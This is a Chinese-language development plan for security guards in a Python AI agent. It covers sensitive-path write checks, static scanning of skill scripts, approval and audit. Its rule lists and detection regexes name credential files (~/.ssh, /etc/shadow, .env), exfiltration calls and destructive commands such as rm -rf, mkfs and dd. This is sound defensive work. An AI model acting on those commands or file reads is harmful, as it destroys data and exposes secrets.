> 把 S4 接进 `tool_guard.assess_write`（Phase 1 已留接口），统一走 `execute()` 网关。**修掉** `_exec_write_file` 的误导文案，**补齐** `_exec_edit_file` 的裸奔。

### 2.1 新增 `rules/sensitive_paths.json`（S4 规则数据）

```json
{
  "version": 1,
  "protected_roots": ["~/.ssh","~/.aws","~/.gnupg","~/.kube","~/.docker/config.json",
                       "~/.config/gh","~/.npmrc","~/.pypirc","/etc","/boot","/dev","/sys"],
  "critical_files":  ["/etc/passwd","/etc/shadow","/etc/sudoers","~/.ssh/id_rsa",
                       "~/.ssh/id_ed25519","~/.aws/credentials"],
  "sensitive_name_patterns": ["\\.env$","id_rsa","id_ed25519","\\.pem$","credentials",
                               "secret","token","\\.netrc$","\\.bashrc$","\\.bash_profile$","\\.zshrc$"]
}
```

### 2.2 `tool_guard.assess_write(path, work_dir, safe_mode) -> Verdict`（实现 Phase 1 预留接口）

```python
def assess_write(path, work_dir, safe_mode):
    p = Path(path).expanduser().resolve()          # 解析符号链接（防 symlink 逃逸出界）
    wd = Path(work_dir).expanduser().resolve()
    findings = []
    # 1) 系统关键文件 → CRITICAL（恒 BLOCK）
    if _is_critical_file(p): return _verdict("CRITICAL", "block", findings, "系统关键文件")
    # 2) 敏感路径（受保护根 或 文件名模式）→ 至少 HIGH（STRONG_CONFIRM；SAFE_MODE→BLOCK）
    if _is_sensitive(p): findings.append("sensitive_path"); sev = "HIGH"
    else:
        # 3) 出界（不在 work_dir 内）
        if _within(p, wd): sev = "INFO"            # 工作目录内 → 放行
        else:
            sev = "BLOCK" if safe_mode else "MEDIUM"
            findings.append("outside_workdir")
    # 4) action = 严重级→动作（SAFE_MODE 升级）
    return _verdict(sev, _action_for(sev, safe_mode), findings, _why(findings))
```

### 2.3 改造 `tools.py`（0.5 清单）
- `_exec_write_file(args)`：**删除**内联 `if not _is_within_workdir: return "Warning...Created."`；只留 mkdir + write（守卫已在 execute 网关）。
- `_exec_edit_file(args)`：保持纯执行（守卫由网关统一加）——**edit_file 从裸奔变受守卫**。
- `assess_call` 的 write_file/edit_file 分支接通 `assess_write`（Phase 1 已留）。

### 2.4 开发任务（Phase 2）
- [ ] `rules/sensitive_paths.json`
- [ ] `tool_guard.py`：`assess_write` + `_is_critical_file` + `_is_sensitive` + `_within`
- [ ] `tools.py`：删 `_exec_write_file` 内联出界检查（修复误导文案）；edit_file 保持纯执行
- [ ] 单测：
  - [ ] work_dir 内 `write_file` → ALLOW（不确认）
  - [ ] 出界 `write_file /etc/hosts`：SAFE_MODE=1→BLOCK；=0→CONFIRM
  - [ ] `write_file ~/.ssh/config` → HIGH 强确认；`write_file /etc/passwd` → CRITICAL BLOCK
  - [ ] symlink：work_dir 内建软链指向 `/etc/x` → 解析后判出界（防逃逸）
  - [ ] `edit_file` 改敏感路径 → 也被拦（回归：edit_file 现在受守卫）
- [ ] 验证：
  - [ ] `SAFE_MODE=1 python agent.py "往 /etc/notes 写一行"` → BLOCK
  - [ ] `python agent.py "改一下 ~/.bashrc"` → 强确认
  - [ ] **回归**：work_dir 内正常写文件**不再**弹任何确认（比现状更顺）；`write_file` 出界不再谎报 "Created."

**Phase 2 成功标准：**
```
$ SAFE_MODE=1 python agent.py "把内容写到 /etc/agent_note"
  ⛔ [严重] 目标在系统受保护目录 (/etc)，且 SAFE_MODE 开启
  Blocked: SAFE_MODE 下禁止写入工作目录外的受保护路径
$ python agent.py "帮我追加一行到 ~/.bashrc"
  ⚠️ [高危] 敏感路径 ~/.bashrc（shell 配置）
  确认修改? [y/N]: y
  输入完整路径以确认: /home/xxx/.bashrc
  OK: 已写入  ✓
```

---

## Phase 3（S5 Skill 静态扫描 + 首次确认 + hash 防篡改）

> skill 是**最危险的注入面**（直接 `subprocess` 跑任意 entry 脚本）。本 Phase 在 `skill_manager` 加载期 + 执行期加静态扫描、首次确认、hash 防篡改。**复用** Phase 1 的 `approval` 与 `audit`。

### 3.1 新增 `skill_scanner.py`（叶子，S5）

```python
# 不 import skill_manager（陷阱 C）；只收 entry 文件绝对路径
import hashlib

RISKY_PATTERNS = [   # (regex, 说明, 严重级)
    (r"subprocess\.(run|call|Popen|check_output|getoutput)", "调用子进程", "HIGH"),
    (r"os\.system\s*\(",                                      "os.system 执行", "HIGH"),
    (r"\beval\s*\(|\bexec\s*\(",                             "eval/exec 动态执行", "HIGH"),
    (r"import\s+(socket|requests|urllib)\b|urlopen|\.post\(|\.get\(", "网络外发", "MEDIUM"),
    (r"[~/][.](ssh|aws|gnupg|kube)|/etc/(passwd|shadow)|id_rsa|\.env\b", "读取凭据", "HIGH"),
    (r"\bDROP\s+(TABLE|DATABASE)\b|TRUNCATE\s|rm\s+-rf",    "破坏性操作", "HIGH"),
    (r"base64\s+(-d|--decode)|\bx6d|zlib\.decompress",       "编码载荷", "MEDIUM"),
]

def scan_entry(entry_path) -> dict
    # 读文件（utf-8, errors=replace，截断 ≤200KB 防 DoS）
    # 逐行匹配 RISKY_PATTERNS → findings=[{line, pattern_desc, severity}]
    # 返回 {"risky": bool, "max_severity": str, "findings": [...], "summary": str(首行 docstring/注释)}
def file_hash(entry_path) -> str          # sha256
def load_trust() -> dict                   # 读 skills/.trusted.json {name: {source, sha256, confirmed_at}}
def save_trust(name, source, sha256) -> None   # 原子写
def verify_trust(name, sha256) -> tuple[bool, str]
    # 未记录→("untrusted", name)；hash 不符→("tampered", name)（防篡改）；一致→("trusted", name)
```

### 3.2 改造 `skill_manager.py`
- `to_tool_schemas()`（加载期）：对每个 skill 的 entry 跑 `skill_scanner.scan_entry`，把 `risky`/`summary` 附到 schema 描述里（提示「⚠️ 含 subprocess」），**不阻断注册**（执行期再拦）。记 `logger.info("skill_scanned", {...})`。
- `execute_skill(name, params)`（执行期，`subprocess.run` **之前**）：
  ```python
  entry_path = skill_dir / entry
  sha = skill_scanner.file_hash(entry_path)
  scan = skill_scanner.scan_entry(entry_path)
  trust, why = skill_scanner.verify_trust(name, sha)
  # 1) 篡改检测：trust=="tampered" → 直接 BLOCK（hash 变了）+ audit
  # 2) 首次加载确认：trust=="untrusted" 或 scan["risky"] →
  #      verdict = {"action":"STRONG_CONFIRM","severity":scan["max_severity"],
  #                 "findings":scan["findings"],"detail":entry_path.name,
  #                 "reason": "首次加载/含风险代码"}
  #      decision = approval.resolve(verdict, confirm_fn, input_fn, ctx={...,"source":"skill"})
  #      拒绝 → return "Blocked: skill 未通过人工审批"
  #      批准 → skill_scanner.save_trust(name, "user", sha)（记住，下次免确认）
  # 3) 通过后 → 原有 subprocess.run（不变）
  ```
  - `execute_skill(name, params, confirm_fn=None, input_fn=None)` 加参数（默认 None=非交互拒绝器）。
- `tools.execute` 的 `skill_*` 分支（陷阱 F）：把 `confirm_fn`/`input_fn`/`session_id` 透传给 `skill_manager.execute_skill`。

### 3.3 改造 `tools.py`（skill 分支）
- `execute` 里 `skill_*` 分支：`skill_manager.execute_skill(skill_name, args, confirm_fn=confirm_fn, input_fn=_raw_input, session_id=session_id)`；`assess_call` 对 `skill_*` 返回 ALLOW（守卫在 skill_manager）。

### 3.4 开发任务（Phase 3）
- [ ] `skill_scanner.py`：`scan_entry` + `file_hash` + 信任读写 + `verify_trust`
- [ ] `skill_manager.py`：加载期扫描标注；执行期 篡改检测 + 首次确认 + 信任落盘
- [ ] `tools.py`：skill 分支透传 confirm/input/session
- [ ] 单测：
  - [ ] 含 `subprocess.run` 的 entry → `scan_entry.risky=True`，severity HIGH
  - [ ] 纯计算 entry → `risky=False`
  - [ ] `verify_trust`：首次→untrusted；存后→trusted；改 entry 一行→tampered
  - [ ] `execute_skill`：untrusted+risky → 需确认；确认后 `skills/.trusted.json` 记录 sha；再执行免确认；改脚本后再执行→tampered BLOCK
- [ ] 验证：
  - [ ] 新增一个 entry 含 `os.system` 的 skill → 首次执行弹强确认（显示 entry 摘要 + 风险项）；批准后下次免确认
  - [ ] 批准后手动改 entry 脚本一行 → 再执行 → 「hash 不匹配，疑似篡改」BLOCK + 审计
  - [ ] `python agent.py` 正常调用一个干净 skill → 首次确认后顺畅（回归：不卡正常 skill）

**Phase 3 成功标准：**
```
> 帮我用 xxx 技能处理这批数据
  ⚠️ [技能 xxx] 首次加载，静态扫描发现风险:
     - L12  os.system 执行  [高危]
     - L30  网络外发        [中危]
     entry: scripts/run.py  (sha256: ab12…)
  确认加载并执行? [y/N]: y
  输入技能名以确认: xxx
  ✓ 已信任（记录 sha256，后续免确认）
  [skill:xxx] ... 执行结果 ...
  # 之后手动改了 scripts/run.py：
  ⛔ [技能 xxx] 文件 hash 不匹配，疑似被篡改，已阻断。请重新确认。
  # logs/audit_*.jsonl: {"event":"skill_exec","action":"blocked","rule_id":"tampered",...}
```

---

## Phase 4（集成回归 + 耦合复验 + 验收）

### 4.1 集成回归（确保无功能遗漏）
- [ ] **全工具冒烟**：read_file / write_file(work_dir 内) / edit_file / shell(普通) / view_image / 正常 skill —— 全程**无**多余确认（ALLOW 静默），行为与 v5.0 一致。
- [ ] **原 8 条危险命令**逐条过：rm -rf / del /s / rmdir /s / Remove-Item -Recurse -Force / format C: / mkfs / dd if= / > /dev/sd —— 严格度 **≥ v5.0**（原来 y/N 的现在至少 CONFIRM，灾难级 BLOCK）。
- [ ] **审批矩阵**：SAFE_MODE 0/1 × {普通/出界/敏感/MEDIUM/HIGH/CRITICAL} 全组合，动作符合映射表。
- [ ] **非交互**：管道 `echo "删 /tmp/x" | python agent.py` → 危险操作被拒、不卡 input、退出码正常。
- [ ] **审计完整性**：跑一轮含拦截的场景 → `audit_*.jsonl` 事件齐全（何时/谁/何命令/拦截与否/是否批准）；JSON 逐行可解析。
- [ ] **skill 信任闭环**：新增→扫描→确认→信任→篡改检测，全链路。

### 4.2 耦合复验（陷阱 A–F 逐条 grep）
- [ ] `grep "import ui" approval.py` 空（陷阱 A）
- [ ] `grep "import tools" tool_guard.py` 空（陷阱 B 铁律1）
- [ ] `grep "import skill_manager" skill_scanner.py` 空（铁律2）
- [ ] `grep "import logger" audit.py` 空（陷阱 D）
- [ ] `grep "WORK_DIR\|SAFE_MODE" tool_guard.py` 无模块级缓存（陷阱 E）
- [ ] `grep "_is_dangerous\|_is_within_workdir\|_DANGEROUS_PATTERNS" tools.py` 仅剩 import/无残留调用（陷阱 B）
- [ ] `python -c "import agent"` 无循环 import
- [ ] 依赖图与 0.6 一致（新增 4 叶子 + 2 JSON + 1 运行时 json，方向单一）

### 4.3 收尾
- [ ] README 补「安全」章节：SAFE_MODE、审批 4 级、审计日志位置、rules/*.json 如何自定义、skill 信任机制。
- [ ] `/help` 补 `/audit`（若做）；`/config` 显示 `safe_mode`。

---

## 风险 & 注意

| 项 | 风险 | 应对 |
|----|------|------|
| 判定上移丢逻辑 | `_is_dangerous`/`_is_within_workdir` 迁走时漏规则 | 0.5 函数级清单逐条核对；原 8 条**全部**重建进 `dangerous_shell.json`；Phase 4 逐条回归 |
| 逃逸误报 | quote-aware 切词/解码边界 | 只对**非引号内**的 `$(`/`` ` ``/管道执行 判逃逸；`echo "..."` 引号内不报；单测覆盖正反例 |
| 逃逸漏报 | 新型混淆 | 规则外置 JSON 可**热扩展**（加 pattern 不改代码）；逃逸类型定级可配；拿不准时**升级**严重级（保守） |
| 强确认卡非交互 | 管道下 input() 阻塞 | 非交互传恒 False confirm_fn → 需确认操作直接拒，不碰 input；`input_fn` EOF/Ctrl-C→拒绝 |
| 审计破坏 append-only | 复用 logger 被 gzip/切天 | 陷阱 D：audit 独立文件 + 独立锁，**不** import logger、不轮转删除 |
| SAFE_MODE 误伤 | 开 SAFE_MODE 后正常写也烦 | SAFE_MODE 只升级「出界/敏感/HIGH shell」，work_dir 内正常写仍 ALLOW；默认关闭 |
| skill 扫描误报 | 正常 skill 含 `requests` 被判风险 | 扫描只**标注 + 首次确认**，不硬拦干净技能；信任后免确认；pattern 可调 |
| skill 篡改误判 | 用户合法改了脚本 | tampered 只**阻断并提示重新确认**（清信任即可），不是永久封禁；审计留痕可查 |
| symlink 逃逸 | work_dir 内软链指向 /etc | `assess_write` 用 `Path.resolve()` 解析符号链接后再判出界；单测覆盖 |
| 审计混入运维日志 | 你要求「计入日志」若指同一文件 | 本 plan 用**独立**安全日志（并列 `logs/`）。若强制同文件：放弃 append-only 保证（10MB 会 gzip），审计链可被清——**不推荐** |
| API_KEY 泄露进审计 | detail 里夹带密钥 | `log_security` 的 `detail` 只记命令/路径/摘要，**不**记 args 全量；后续如需可在 audit 内加最小脱敏（不在本版范围，S1 保持明文） |

## 开发顺序总览

```
Phase 1 (S7 + S3 + 审批)  audit.py + rules/dangerous_shell.json + tool_guard(shell)
                          + approval.py + tools 网关重构 + agent 接线
   ↓  （审计与审批成为地基）
Phase 2 (S4)  tool_guard.assess_write + rules/sensitive_paths.json + write/edit 守卫 + SAFE_MODE 真阻断
   ↓
Phase 3 (S5)  skill_scanner.py + skill_manager 加载/执行期 扫描/确认/防篡改（复用 approval+audit）
   ↓
Phase 4       集成回归 + 陷阱 A–F grep 复验 + README + /audit
```
> 严格 1→2→3→4。Phase 1 交付即可用（shell 逃逸 + 审批 + 审计）；2/3 各自独立可交付、可回归；4 是总验收。每 Phase 自带单测（unittest，零依赖）。

## 完成后项目结构（v6.0）

```
agent_in/
├── agent.py             # 入口（+ tools.SAFE_MODE 接线 / execute 传 session_id / 非交互 confirm_fn / /audit）
├── llm.py               # 不变（S1 保持明文 key）
├── tools.py             # execute 统一安全网关；删 _is_dangerous/_is_within_workdir/_DANGEROUS_PATTERNS；_exec_* 纯执行
├── tool_guard.py        # 新建 S3+S4 判定（shell 逃逸 + 文件守卫，读 rules/*.json）
├── approval.py          # 新建 人工审批（4 级，confirm_fn/input_fn 注入，不 import ui）
├── audit.py             # 新建 S7 append-only 审计日志（独立文件/锁，不 import logger）
├── skill_scanner.py     # 新建 S5 静态扫描 + hash + 信任记录
├── skill_manager.py     # 加载期扫描标注 + 执行期 篡改检测/首次确认/信任落盘
├── rules/
│   ├── dangerous_shell.json   # S3 shell 规则（原 8 条 + Windows + CRITICAL + 逃逸定级）
│   └── sensitive_paths.json   # S4 敏感路径规则
├── config.py providers.py session.py context.py usage.py  # plan4
├── retry.py rate_limiter.py capability.py                # plan5
├── ui.py vision.py memory_manager.py logger.py           # 不变
├── skills/
│   └── .trusted.json    # 运行时（S5）首次确认 + sha256 信任记录
└── memory/ logs/ sessions/ usage/
      └── audit_YYYY-MM.jsonl   # 运行时（S7）append-only 安全审计
```

> **零依赖承诺**：`tool_guard / approval / audit / skill_scanner` 全部 stdlib only（json / re / os / pathlib / hashlib / threading / time / functools），**不引任何 pip 包**。规则用 JSON 外置（stdlib 无 YAML，故不用 YAML），审计/信任用独立 append-only 文件。
